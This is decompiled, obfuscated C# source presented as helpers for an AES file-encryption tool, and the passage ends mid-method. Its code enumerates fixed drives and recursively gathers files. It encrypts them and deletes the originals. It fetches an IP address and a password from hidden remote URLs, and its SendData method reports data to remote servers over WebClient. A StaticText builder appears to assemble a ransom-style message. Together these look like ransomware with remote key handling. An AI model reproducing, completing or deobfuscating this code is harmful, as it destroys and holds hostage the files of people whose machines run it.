using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using A6yJVNZuoAn9NC1LAS;
using SharpAESCrypt;

namespace AESxWin.Helpers;

public static class _0092_008C_0095_0095_0095_008C_008D_0089_008D_0090_0086_008A_0094_0092_008B_008B_0093_0089_008E_008D_0087_0086_008A_008E_0091_0086_0087_0089_008F_0087_0089_008F_0086_008E_0093_008E
{
	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(_003CEncryptFileAsync_003Ed__0))]
	[DebuggerStepThrough]
	public static Task EncryptFileAsync(this string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0045
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_00ad: Incompatible stack heights: 0 vs 1
		int num = 5;
		AsyncTaskMethodBuilder _003C_003Et__builder = default(AsyncTaskMethodBuilder);
		_003CEncryptFileAsync_003Ed__0 stateMachine = default(_003CEncryptFileAsync_003Ed__0);
		while (true)
		{
			int num3;
			int num2;
			switch (num)
			{
			case 0:
				_003C_003Et__builder.Start(ref stateMachine);
				num = 9;
				break;
			case 1:
				_003C_003Et__builder = stateMachine._003C_003Et__builder;
				num3 = 0;
				goto IL_004a;
			case 6:
				stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder.Create();
				goto default;
			case 2:
			case 8:
				stateMachine.password = _0020;
				num3 = 6;
				goto IL_004a;
			case 3:
				stateMachine.path = _0020;
				_ = 1;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					num3 = 7;
					goto IL_004a;
				}
				num2 = 8;
				goto IL_004e;
			case 5:
				stateMachine = new _003CEncryptFileAsync_003Ed__0();
				num2 = 3;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_004e;
				}
				goto default;
			default:
				stateMachine._003C_003E1__state = -1;
				num3 = 1;
				goto IL_004a;
			case 9:
				{
					return stateMachine._003C_003Et__builder.Task;
				}
				IL_004e:
				num = num2;
				break;
				IL_004a:
				num2 = num3;
				goto IL_004e;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void EncryptFileAsync(this string _0020, string _0020, bool _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		if (!_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(112))
		{
			return;
		}
		try
		{
			_008A_008E_0094_008E_0095_0089_008F_0092_0088_0093_008A_008E_008A_0089_0087_0090_0095_0091_0088_0088_0087_0088_0095_0090_0092_008A_0091_0091_008B_0093_0090_008E_008B_0088_008B_0089.Encrypt(_0020, _0020, _0020 + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(256));
			if (_0020)
			{
				try
				{
					File.Delete(_0020);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch (Exception ex)
		{
			string text = DateTime.Now.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2212));
			string text2 = Path.Combine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(212), text + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(224));
			_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(text2, ex.ToString());
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CEncryptFilesAsync_003Ed__2))]
	public static Task EncryptFilesAsync(this IEnumerable<string> paths, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_003CEncryptFilesAsync_003Ed__2 stateMachine = new _003CEncryptFilesAsync_003Ed__2();
		stateMachine.paths = paths;
		stateMachine.password = _0020;
		stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder.Create();
		stateMachine._003C_003E1__state = -1;
		AsyncTaskMethodBuilder _003C_003Et__builder = stateMachine._003C_003Et__builder;
		_003C_003Et__builder.Start(ref stateMachine);
		return stateMachine._003C_003Et__builder.Task;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(_003CDecryptFileAsync_003Ed__3))]
	[DebuggerStepThrough]
	public static Task DecryptFileAsync(this string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0036
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 7;
		_003CDecryptFileAsync_003Ed__3 stateMachine = default(_003CDecryptFileAsync_003Ed__3);
		AsyncTaskMethodBuilder _003C_003Et__builder = default(AsyncTaskMethodBuilder);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				IL_003f:
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 1:
						break;
					case 8:
						stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder.Create();
						goto end_IL_0043;
					default:
						goto end_IL_0043;
					case 5:
						_003C_003Et__builder = stateMachine._003C_003Et__builder;
						goto case 2;
					case 3:
					case 4:
						stateMachine._003C_003E1__state = -1;
						num2 = 5;
						if (true)
						{
							goto IL_003f;
						}
						goto case 0;
					case 0:
						stateMachine.path = _0020;
						num2 = 1;
						if (true)
						{
							goto IL_003f;
						}
						goto case 7;
					case 7:
						stateMachine = new _003CDecryptFileAsync_003Ed__3();
						num3 = 0;
						continue;
					case 2:
					case 6:
						_003C_003Et__builder.Start(ref stateMachine);
						num = 9;
						goto end_IL_003f;
					case 9:
						return stateMachine._003C_003Et__builder.Task;
					}
					stateMachine.password = _0020;
					num2 = 8;
					goto IL_003f;
					continue;
					end_IL_0043:
					break;
				}
				_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
				num = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 2 : 3);
				break;
				continue;
				end_IL_003f:
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string RemoveExtension(this string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return Path.ChangeExtension(_0020, "")!.TrimEnd(new char[1] { '.' });
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CDecryptFilesAsync_003Ed__5))]
	public static Task DecryptFilesAsync(this IEnumerable<string> paths, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_003CDecryptFilesAsync_003Ed__5 stateMachine = new _003CDecryptFilesAsync_003Ed__5();
		stateMachine.paths = paths;
		stateMachine.password = _0020;
		stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder.Create();
		stateMachine._003C_003E1__state = -1;
		AsyncTaskMethodBuilder _003C_003Et__builder = stateMachine._003C_003Et__builder;
		_003C_003Et__builder.Start(ref stateMachine);
		return stateMachine._003C_003Et__builder.Task;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static IEnumerable<string> GetFolderFilesPaths(this string _0020, bool _0020 = true)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		List<string> list = new List<string>();
		try
		{
			if (!Directory.Exists(_0020))
			{
				return list;
			}
			if (_0020)
			{
				string[] directories = Directory.GetDirectories(_0020);
				if (directories != null)
				{
					string[] array = directories;
					foreach (string text in array)
					{
						list.AddRange(text.GetFolderFilesPaths());
					}
				}
			}
			string[] files = Directory.GetFiles(_0020);
			if (files != null)
			{
				list.AddRange(files);
			}
		}
		catch
		{
		}
		return list;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static IEnumerable<string> ParseExtensions(this string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		List<string> list = new List<string>();
		string value = Regex.Match(_0020, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2216)).Value;
		if (!string.IsNullOrWhiteSpace(value))
		{
			_0020 = _0020.Replace(value, string.Empty);
		}
		MatchCollection matchCollection = Regex.Matches(_0020, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2220));
		foreach (object item in matchCollection)
		{
			list.Add(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2224) + item.ToString());
		}
		return list;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool CheckExtension(this string _0020, IEnumerable<string> extensions)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		if (extensions == null)
		{
			return true;
		}
		if (extensions.Count() == 0)
		{
			return true;
		}
		foreach (string extension in extensions)
		{
			if (_0020.ToLower().EndsWith(extension.ToLower()))
			{
				return true;
			}
		}
		return false;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool CheckExtension(this string _0020, string[] _0020)
	{
		//Discarded unreachable code: IL_0005, IL_00a4, IL_014e
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0083: Incompatible stack heights: 0 vs 1
		int num = 9;
		int num5 = default(int);
		string[] array = default(string[]);
		string text = default(string);
		bool result = default(bool);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num3;
			int num2;
			switch (num)
			{
			case 6:
			case 7:
			case 8:
				if (num5 >= array.Length)
				{
					num3 = 11;
					goto IL_00a9;
				}
				text = array[num5];
				num = 2;
				break;
			case 11:
				result = false;
				num3 = 14;
				goto IL_00a9;
			case 10:
				num5 = 0;
				goto case 6;
			case 4:
				if (flag2)
				{
					num2 = 0;
					goto IL_00ad;
				}
				array = _0020;
				goto case 10;
			case 12:
				result = true;
				_ = 1;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					num2 = 6;
					if (1 == 0)
					{
						goto case 4;
					}
				}
				else
				{
					num2 = 1;
				}
				goto IL_00ad;
			default:
				num3 = 10;
				goto IL_00a9;
			case 0:
				result = true;
				num = 13;
				break;
			case 2:
				try
				{
					bool flag3 = _0020.ToLower().EndsWith(text.ToLower());
					_ = 0;
					int num4;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num4 = 3;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_0157;
						}
					}
					else
					{
						num4 = 2;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto IL_0157;
						}
					}
					goto IL_0192;
					IL_0192:
					result = true;
					num4 = 4;
					goto IL_0157;
					IL_0157:
					switch (num4)
					{
					case 0:
					case 3:
						if (flag3)
						{
							break;
						}
						goto end_IL_0109;
					case 4:
						return result;
					}
					goto IL_0192;
					end_IL_0109:;
				}
				catch
				{
				}
				num5++;
				num3 = 7;
				goto IL_00a9;
			case 5:
				if (!flag)
				{
					flag2 = _0020.Count() == 0;
					num2 = 4;
					if (1 == 0)
					{
						goto case 6;
					}
				}
				else
				{
					num2 = 12;
				}
				goto IL_00ad;
			case 9:
				flag = _0020 == null;
				num = 5;
				break;
			case 1:
			case 3:
			case 13:
			case 14:
				{
					return result;
				}
				IL_00ad:
				num = num2;
				break;
				IL_00a9:
				num2 = num3;
				goto IL_00ad;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static DriveInfo[] GetDrives()
	{
		//Discarded unreachable code: IL_0005, IL_0083
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 0;
		IEnumerable<DriveInfo> enumerable = default(IEnumerable<DriveInfo>);
		DriveInfo[] result = default(DriveInfo[]);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 6:
						while (enumerable != null)
						{
							num2 = 2;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								goto end_IL_0090;
							}
						}
						goto IL_00e7;
					case 0:
						enumerable = from _0020 in DriveInfo.GetDrives()
							where _0020.DriveType == DriveType.Fixed
							select _0020;
						num2 = 6;
						break;
					case 2:
						if (enumerable.Any())
						{
							goto default;
						}
						goto IL_00e7;
					default:
						_ = 0;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_00c0;
						}
						goto end_IL_008c;
					case 3:
					case 5:
						result = enumerable.ToArray();
						goto case 1;
					case 1:
					case 4:
					case 7:
						{
							return result;
						}
						IL_00e7:
						result = null;
						num2 = 7;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							break;
						}
						goto case 2;
						end_IL_0090:
						break;
					}
					break;
					IL_00c0:
					num3 = 5;
				}
				continue;
				end_IL_008c:
				break;
			}
			num = 1;
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _0094_0090_008D_0086_008A_0087_0087_008C_0092_0091_0090_0089_008B_0091_0087_0092_008D_008B_0088_008E_0093_0088_0091_0095_008F_0095_0094_0087_0094_0089_008E_0086_0095_0094_0094_0091
{
	private static int CurrentIndex = 0;

	public static Uri[] Urls = new Uri[2]
	{
		new Uri(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2228)),
		new Uri(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2232))
	};

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CGetIP_003Ed__2))]
	public static Task<string> GetIP()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_003CGetIP_003Ed__2 stateMachine = new _003CGetIP_003Ed__2();
		stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder<string>.Create();
		stateMachine._003C_003E1__state = -1;
		AsyncTaskMethodBuilder<string> _003C_003Et__builder = stateMachine._003C_003Et__builder;
		_003C_003Et__builder.Start(ref stateMachine);
		return stateMachine._003C_003Et__builder.Task;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086
{
	public static object _locker = new object();

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void WriteLog(string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0076
		//IL_0006: Incompatible stack heights: 0 vs 1
		try
		{
			lock (_locker)
			{
				_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
				int num;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					num = 2;
					if (1 == 0)
					{
						goto IL_0038;
					}
				}
				else
				{
					num = 3;
				}
				switch (num)
				{
				case 0:
				case 2:
					break;
				default:
					return;
				case 3:
					return;
				}
				goto IL_0038;
				IL_0038:
				File.AppendAllText(_0020, string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2236), DateTime.Now.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2240)), _0020 + Environment.NewLine));
			}
		}
		catch
		{
		}
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _008B_008D_008A_008F_008B_008D_0086_0091_0092_0089_0089_0090_008D_008A_008C_0087_008C_008C_0086_008F_0093_0095_0090_008B_0090_0087_0095_0095_0094_008C_0086_0087_0094_008B_008F_0090
{
	private static int CurrentIndex = 0;

	public static Uri[] Urls = new Uri[2]
	{
		new Uri(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2244)),
		new Uri(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2248))
	};

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(_003CGetPassword_003Ed__2))]
	[DebuggerStepThrough]
	public static Task<string> GetPassword()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		_003CGetPassword_003Ed__2 stateMachine = new _003CGetPassword_003Ed__2();
		stateMachine._003C_003Et__builder = AsyncTaskMethodBuilder<string>.Create();
		stateMachine._003C_003E1__state = -1;
		AsyncTaskMethodBuilder<string> _003C_003Et__builder = stateMachine._003C_003Et__builder;
		_003C_003Et__builder.Start(ref stateMachine);
		return stateMachine._003C_003Et__builder.Task;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _0088_0095_0093_0088_0093_0095_0090_008F_0095_0090_0095_008F_0092_0087_008C_0092_0089_008B_0090_008A_0090_0089_0092_0095_0090_008E_008D_008E_0088_008F_0095_0089_0088_008F_008C_008F
{
	private static int CurrentIndex = 0;

	public static string[] Urls = new string[2]
	{
		_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2260),
		_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2264)
	};

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string SendData(string _0020, string _0020, DateTime _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_004b, IL_00e7
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 0;
		if (1 == 0)
		{
			goto IL_0016;
		}
		goto IL_0054;
		IL_0054:
		int num2 = num;
		goto IL_0058;
		IL_0058:
		switch (num2)
		{
		case 0:
			break;
		case 1:
		case 4:
			goto IL_0040;
		default:
			goto IL_0085;
		case 5:
			goto IL_01eb;
		}
		goto IL_0016;
		IL_0016:
		string empty = string.Empty;
		_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 4;
			if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				goto IL_0040;
			}
			goto IL_0054;
		}
		num2 = 3;
		goto IL_0058;
		IL_01eb:
		string result = default(string);
		return result;
		IL_0040:
		CurrentIndex = 0;
		goto IL_0085;
		IL_0085:
		try
		{
			string text = _0020.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2252));
			string absoluteUri = default(string);
			Uri uri = default(Uri);
			for (int i = 0; i < Urls.Length; i++)
			{
				if (string.IsNullOrEmpty(Urls[CurrentIndex]))
				{
					continue;
				}
				try
				{
					WebClient webClient = new WebClient();
					_ = 0;
					int num3 = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 4 : 3);
					while (true)
					{
						int num4;
						switch (num3)
						{
						case 1:
						case 4:
							absoluteUri = uri.AbsoluteUri;
							goto case 2;
						default:
							num4 = 2;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								goto IL_00f0;
							}
							goto case 2;
						case 2:
							webClient.DownloadString(absoluteUri);
							num4 = 5;
							goto IL_00f0;
						case 0:
						case 3:
							uri = new Uri(new Uri(Urls[CurrentIndex]), string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2256), _0020, _0020, text, _0020));
							goto case 1;
						case 5:
							CurrentIndex = 0;
							break;
						}
						break;
						IL_00f0:
						num3 = num4;
					}
				}
				catch (Exception)
				{
					CurrentIndex++;
					continue;
				}
				break;
			}
		}
		catch
		{
		}
		result = empty;
		num = 5;
		if (true)
		{
			goto IL_0054;
		}
		goto IL_01eb;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _0095_008F_0094_008F_008B_008C_0087_0091_0093_008C_0087_0090_0088_0092_008C_0090_0088_008B_008F_008B_0086_0088_0093_0090_0088_0092_008D_0086_0087_0093_008D_0091_0095_0086_0095_0090
{
	public static string StaticText
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005, IL_027a
			//IL_0006: Incompatible stack heights: 0 vs 1
			int num = 34;
			if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				goto IL_001a;
			}
			goto IL_0283;
			IL_0283:
			int num2 = num;
			goto IL_0287;
			IL_0287:
			StringBuilder stringBuilder = default(StringBuilder);
			string result = default(string);
			while (true)
			{
				int num3;
				switch (num2)
				{
				case 24:
					break;
				case 7:
				case 8:
					goto IL_003a;
				case 4:
					goto IL_005a;
				case 0:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2320));
